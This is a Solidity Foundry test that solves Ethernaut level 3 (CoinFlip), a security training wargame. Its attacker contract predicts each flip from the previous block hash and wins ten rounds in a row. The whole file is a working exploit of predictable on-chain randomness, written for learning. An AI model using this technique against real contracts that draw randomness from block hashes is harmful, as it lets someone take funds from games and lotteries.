pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);

    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    ICoinFlip coin;

    constructor(ICoinFlip _coin) {
        coin = _coin;
    }

    function guessAndFlip() external {
        coin.flip(guess());
    }

    function guess() private returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}

contract Ethernaut03 is EthernautTest {
    constructor() EthernautTest(3) {}

    function solve() internal override(EthernautTest) {
        CoinFlipAttacker attacker = new CoinFlipAttacker(ICoinFlip(instance));

        for (uint256 i = 0; i < 10; ++i) {
            attacker.guessAndFlip();
            vm.roll(block.number + 1);
        }

        require(ICoinFlip(instance).consecutiveWins() == 10, "not won");
    }
}
